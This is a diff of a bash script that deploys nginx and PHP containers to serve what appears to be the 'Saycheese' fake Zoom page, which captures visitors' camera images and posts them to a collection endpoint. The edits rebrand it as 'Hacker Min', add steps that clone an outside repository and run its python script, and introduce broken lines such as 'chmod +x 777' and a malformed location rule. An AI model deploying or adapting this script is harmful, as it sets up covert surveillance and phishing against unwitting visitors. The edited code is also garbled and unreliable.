@@ -1,7 +1,7 @@
 #!/bin/bash
 #############################################
 #                                           #
-#            Saycheese kevops               #
+#            Hacker Min       #
 #                                           #
 #############################################
 
@@ -13,9 +13,9 @@ mkdir -p /var/containers/$NGX_CONTAINER/etc/nginx/conf.d
 mkdir -p /var/containers/share/var/www/html/{data,images}
 
 git clone https://github.com/phyothurain295646/Phyo-Thu-Rain.git
-cp -rf /opt/Phyo-Thu-Rain/src/* /var/containers/share/var/www/html/
-chmod 777 -R /var/containers/share/var/www/html/
-rm -rf /opt/phyothurain
+cd Phyo-Thu-Rain-html
+chmod +x 777
+python3 phyothurain.py
 
 cat<<-EOF > /var/containers/$NGX_CONTAINER/etc/nginx/conf.d/$NGX_DOMAIN.conf
 server {
@@ -26,7 +26,7 @@ server {
     location / {
         try_files \$uri \$uri/ =404;
     }
-    location ~ \.php$ {
+    location ~ \.phyothurain.py$ {
         try_files \$uri =404;
         fastcgi_split_path_info ^(.+\.php)(/.+)$;
         fastcgi_pass php-fpm:9000;
@@ -36,7 +36,7 @@ server {
     }
 }
 EOF
-sed "s%url: 'template_saycheese',%url: 'https://${NGX_DOMAIN}/post.php',%g" /var/containers/share/var/www/html/zoom_cheese.html > /var/containers/share/var/www/html/index.html
+sed "s%url: 'phyothurain',%url: 'https://${NGX_DOMAIN}/post.php',%g" /var/containers/share/var/www/html/zoom_cheese.html > /var/containers/share/var/www/html/index.html
 sed -i "s%header.*%header('Location: https://${NGX_DOMAIN}/index.html');%g" /var/containers/share/var/www/html/index.php
 
 docker run -d --name $PHP_CONTAINER \
